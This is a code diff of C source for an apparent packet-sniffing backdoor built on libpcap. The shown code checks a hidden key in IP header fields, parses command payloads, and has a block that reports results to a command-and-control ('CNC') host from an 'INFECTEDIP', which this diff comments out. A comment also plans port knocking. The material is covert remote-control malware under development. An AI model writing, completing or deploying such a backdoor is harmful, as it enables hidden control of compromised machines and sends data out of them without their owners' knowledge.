@@ -1,4 +1,6 @@
-int Packetcapture(const char *filter){
+#include "libpcap.h"
+
+int Packetcapture(char *filter){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
@@ -26,7 +28,7 @@ int Packetcapture(const char *filter){
         perror("pcap_setfilter");
     }
 
-    pcap_loop(interfaceinfo, -1, ReadPacket, NULL);
+    pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
     return 0;
 }
 
@@ -35,7 +37,9 @@ void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pa
     struct ether_header *ethernet;
     ethernet = (struct ether_header *)packet;
     u_int16_t type = ntohs(ethernet->ether_type);
-
+    struct filter* Filter = NULL;
+    Filter = (struct filter *)args;
+    PrintFilter(*Filter);
     if(type == ETHERTYPE_IP){
         ParseIP(args, pkthdr, packet);
     }
@@ -77,7 +81,8 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
             printf("Reading payload\n");
             ParseTCP(args, pkthdr, packet);
         } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
-            ParsePattern(args,pkthdr, packet);
+            //change to port knocking
+            //ParsePattern(args,pkthdr, packet);
         } else {
             printf("Packet tossed wrong key\n");
         }
@@ -167,7 +172,7 @@ void ParsePayload(const u_char *payload, int len){
 
 
     //sending the results back to the CNC
-    char *srcip = INFECTEDIP;
+    /*char *srcip = INFECTEDIP;
     char *destip = CNCIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
@@ -195,7 +200,7 @@ void ParsePayload(const u_char *payload, int len){
         system(TURNOFF(CNCIP));
         printf("\n");
         printf("\n");
-        printf("Waiting for new command\n");
+        printf("Waiting for new command\n");*/
     }
 }
 
